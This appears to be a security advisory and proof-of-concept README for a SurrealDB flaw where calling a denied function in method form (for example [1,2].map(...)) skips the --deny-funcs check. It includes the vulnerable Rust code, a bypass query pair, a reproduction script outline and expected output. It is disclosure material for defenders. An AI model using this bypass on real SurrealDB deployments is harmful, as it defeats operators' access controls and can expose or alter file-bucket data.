# SurreaSideDoor — SurrealDB `--deny-funcs` capability bypass via method-style calls

CVE-2026-121416 / GHSA-p296-7pr4-87rr (SurrealDB < 3.3.1, fixed in 3.3.1)

| | |
|---|---|
| Product + version | SurrealDB (Rust) 3.3.0 (and earlier; the streaming path is affected since 2.0.0) |
| CVSS | 7.1 HIGH — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` |
| CWE | CWE-284 (Improper Access Control) / CWE-636 (Not Failing Securely) |

- Fix commit: [fc6ec74e11df](https://github.com/surrealdb/surrealdb/commit/fc6ec74e11df) (backported to 3.3 as #1444)
- Advisories: [GHSA-p296-7pr4-87rr](https://github.com/surrealdb/surrealdb/security/advisories/GHSA-p296-7pr4-87rr), [VulnCheck](https://www.vulncheck.com/advisories/surrealdb-2.0.0-before-3.3.1-deny-funcs-capability-bypass-via-method-style-invocations)
- Vulnerable tag: `v3.3.0` (`238bfeb11f5725bebed370167656748df8067595`); fixed tag: `v3.3.1` (`2187e444e741b91bf49aa071c837edea3d3d3d12`)

## Summary

`--deny-funcs` (CLI flag / `SURREAL_CAPS_DENY_FUNC`) is SurrealDB's function-level
security control: once an operator denies a function family, no subject may execute it.
The check is spread across **four** call sites rather than one central dispatcher, and
the **method-style invocation path of the streaming engine (the default engine in 3.x)
performs no check at all**. A denied function is therefore trivially reachable by
calling it as a method on a value instead of in its normal `family::name(...)` form.

## Vulnerable code

`surrealdb/core/src/exec/parts/method.rs` (`MethodPart::evaluate`, v3.3.0):

```rust
fn evaluate<'a>(&'a self, ctx: EvalContext<'a>) -> BoxFut<'a, FlowResult<Value>> {
    Box::pin(async move {
        let value = ctx.current_value.cloned().unwrap_or(Value::None);
        // ... descriptor.resolve() -> straight to invoke, with NO capability check
        let Some(func) = self.descriptor.resolve(&value) else {          // line 61
            return closure_field_call(...).await;
        };
        // (fixed in 3.3.1: ctx.check_allowed_function(func.name())?;  inserted here)
        let mut func_args = Vec::with_capacity(1 + self.args.len());
        func_args.push(value);
        for arg_expr in &self.args {
            let arg_value = arg_expr.evaluate(ctx.clone()).await?;
            func_args.push(arg_value);
        }
        let result = if func.is_pure() && !func.is_async() {
            func.invoke(func_args)                                        // line 88
        } else {
            func.invoke_async(&ctx, func_args).await
        };
        ...
```

The three call sites that *do* check (for contrast): `expr/function.rs:90`,
`physical_expr/function/builtin.rs:46`, and legacy `fnc/mod.rs:671`. The fix inserts
`ctx.check_allowed_function(func.name())?;` immediately after `descriptor.resolve()`.

## Exploit chain

1. Operator starts SurrealDB hardened with `--deny-funcs array::map` (or `file::*`,
   `http::*`, `math::*`, etc.) to forbid a function family.
2. A subject that can submit SurrealQL queries calls the denied function in **method
   form** instead of normal form.
3. `MethodPart::evaluate` resolves the method descriptor to the *same* registry entry a
   direct call would hit, then invokes it without ever consulting the deny list.
4. The denied function executes and returns a value.

```
--deny-funcs array::map
RETURN array::map([1,2], |$x| $x * 2)   -> ERR "Function 'array::map' is not allowed to be executed"
RETURN [1,2].map(|$x| $x * 2)           -> OK  [2,4]        <-- bypass
```

The advisory verifies 10 deny families bypass in method form (`array::map`, `math::abs`,
`record::exists`, `value::chain`, `string::len`, `array::any`/`.some()`,
`array::sort::asc`/`.sort_asc()`, `type::string`/`.to_string()`, `file::get`, and the
`file::*` family wildcard). On 3.3.x deployments with the experimental Files feature
enabled, `deny file::*` is voided so `.put()` writes and `.get()` reads file-bucket data.

## Exploitability assessment (honest)

- **Reachability**: any subject that can submit a query (HTTP `/sql`, WebSocket, RPC,
  or `DEFINE FUNCTION` bodies / custom APIs). No other prerequisites. A low-privilege
  authenticated user (`PR:L`) is enough; guest access also reaches it when enabled.
- **Precondition**: the deployment must actually *use* `--deny-funcs` as a hardening
  control. Out-of-the-box deployments that configure no deny rules are unaffected —
  this is a *defeat of an explicit security control*, not a universal RCE.
- **Impact**: the deny list is fully voided (streaming) or partially voided (legacy
  alias/dead-branch defects reported alongside). Worst verified scenario is bucket data
  read + write under `deny file::*` (confidentiality HIGH, integrity LOW), hence 7.1.
- **Threat model**: this is an **authorization/capability-bypass** (CWE-284/636), not
  memory unsafety. The PoC demonstrates the capability-bypass boundary directly against
  the real binaries, not a crash primitive.

## Reproduction (run.sh)

The PoC drives the **real prebuilt `surrealdb` release binaries** (Rust toolchain not
required). It starts `v3.3.0` and `v3.3.1`, issues the normal and method forms, and
asserts the vulnerable side bypasses while the fixed side blocks.

Prerequisite — fetch the two official release binaries (Linux x86_64, ~350 MB each):

```bash
mkdir -p /home/millie/tools/surreal-bin && cd /home/millie/tools/surreal-bin
curl -sL -o s0.tgz https://github.com/surrealdb/surrealdb/releases/download/v3.3.0/surreal-v3.3.0.linux-amd64.tgz && tar xzf s0.tgz && mv surreal surreal-3.3.0
curl -sL -o s1.tgz https://github.com/surrealdb/surrealdb/releases/download/v3.3.1/surreal-v3.3.1.linux-amd64.tgz && tar xzf s1.tgz && mv surreal surreal-3.3.1
rm -f s0.tgz s1.tgz
```

Then:

```bash
bash run.sh
```

Expected output (abridged):

```
[1] vulnerable server v3.3.0  --deny-funcs array::map
    normal form : [{"kind":"NotAllowed",... "Function 'array::map' is not allowed ..."}]
    method form : [{"result":[2,4],"status":"OK",...}]
    [BYPASS] method form EXECUTED despite deny-funcs -> [2,4]
[2] fixed server v3.3.1  --deny-funcs array::map
    method form : [{"kind":"NotAllowed",... "Function 'array::map' is not allowed ..."}]
    [fixed] method form is DENIED on v3.3.1
RESULT: CONFIRMED ...
```

`run.sh` exits 0 only when the vulnerable-side bypass **and** the fixed-side block are
both observed.

## Self-critique (mandatory — 3 ways this might NOT hold)

1. **"It's just `array::map`, not a real boundary."** — The demonstrated function is a
   pure computation. The real boundary is the *deny mechanism itself*: the advisory
   (and upstream's own fix) confirms the same missing check voids `file::*`, `http::*`
   and every other deny family, because the check is simply absent on this dispatch
   path. I verified `string::len`/`file::get` families are registered through the same
   `MethodPart` path and the fix covers the family wildcard (`check_allowed_function`
   on the *resolved* name). The PoC uses `array::map` because it needs no Files/network
   backend to demonstrate — the capability-bypass is the demonstrated primitive.
2. **"Only affects operators who opt into deny-funcs."** — True, and stated. That is
   precisely the security control being defeated; CVSS `PR:L` and `C:H/I:L` reflect a
   low-privilege authenticated actor defeating an explicit hardening control, not a
   guest-to-root chain.
3. **"A static binary demo, not the source build."** — The binaries are SurrealDB's
   official GitHub release artifacts at the exact pinned tags; I additionally diffed
   `surrealdb/core/src/exec/parts/method.rs` between `v3.3.0` and `v3.3.1` and confirmed
   the only relevant change is the inserted `ctx.check_allowed_function(func.name())?;`.
